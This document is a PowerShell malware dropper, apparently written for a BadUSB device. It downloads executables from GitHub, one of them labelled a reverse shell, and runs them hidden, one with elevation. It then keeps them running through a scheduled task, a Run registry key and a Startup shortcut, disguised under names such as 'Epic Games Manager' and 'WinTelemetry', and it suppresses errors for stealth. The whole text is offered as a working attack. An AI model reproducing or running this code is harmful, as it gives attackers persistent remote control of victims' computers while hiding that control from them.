
# =======================
# === CONFIG SECTION ===
# =======================

# Primary Reverse Shell EXE
$mainExeUrl = "https://raw.githubusercontent.com/the-shadow-walker/Obfuscated Programs/Epic-Games.exe"
$mainExePath = "$env:APPDATA\.exe"
$mainTaskName = "Epic Games Manager"
$mainRunKey = "Epic Games"

# Secondary Payload EXE


# One-Time Payload
$telemetryUrl = "https://raw.githubusercontent.com/the-shadow-walker/bad-usb-flipper-payloads/main/EXE/WinTelemetry.exe"
$telemetryPath = "$env:TEMP\WinTelemetry.exe"

# ============================
# === PERSISTENCE FUNCTION ===
# ============================

function Add-Persistence {
    param (
        [string]$exePath,
        [string]$exeUrl,
        [string]$taskName,
        [string]$runKeyName
    )

    try {
        # Download EXE if missing
        if (-not (Test-Path $exePath)) {
            Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -UseBasicParsing
        }

        # Start silently
        Start-Process -FilePath $exePath -WindowStyle Hidden

        # Scheduled task setup
        $action = New-ScheduledTaskAction -Execute $exePath
        $triggers = @(
            New-ScheduledTaskTrigger -AtLogOn
            New-ScheduledTaskTrigger -AtStartup
            New-ScheduledTaskTrigger -AtIdle -IdleDuration (New-TimeSpan -Minutes 1)
            New-ScheduledTaskTrigger -AtWorkStationUnlock
            New-ScheduledTaskTrigger -Once -At ((Get-Date).AddMinutes(1))
        )
        $settings = New-ScheduledTaskSettingsSet -RestartCount 5 -RestartInterval (New-TimeSpan -Minutes 1)

        # Create scheduled task if it doesn't already exist
        if (-not (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue)) {
            Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $triggers -Settings $settings -RunLevel Highest
        }

        # Registry fallback
        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $runKeyName -Value $exePath

        # Startup folder shortcut
        $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
        $shortcutPath = Join-Path $startupPath "$taskName.lnk"
        $WScriptShell = New-Object -ComObject WScript.Shell
        $shortcut = $WScriptShell.CreateShortcut($shortcutPath)
        $shortcut.TargetPath = $exePath
        $shortcut.WorkingDirectory = Split-Path $exePath
        $shortcut.WindowStyle = 7
        $shortcut.Save()
    } catch {
        # Silent failure for stealth
    }
}

# ===========================
# === EXECUTE PERSISTENCE ===
# ===========================

Add-Persistence -exePath $mainExePath -exeUrl $mainExeUrl -taskName $mainTaskName -runKeyName $mainRunKey

# ============================
# === ONE-TIME PAYLOAD RUN ===
# ============================

try {
    Invoke-WebRequest -Uri $telemetryUrl -OutFile $telemetryPath -UseBasicParsing
    Start-Process -FilePath $telemetryPath -Verb RunAs -WindowStyle Hidden
    Start-Sleep -Seconds 5
    # Optionally delete it
    # Remove-Item -Path $telemetryPath -Force
} catch {
    # Silent fail
}
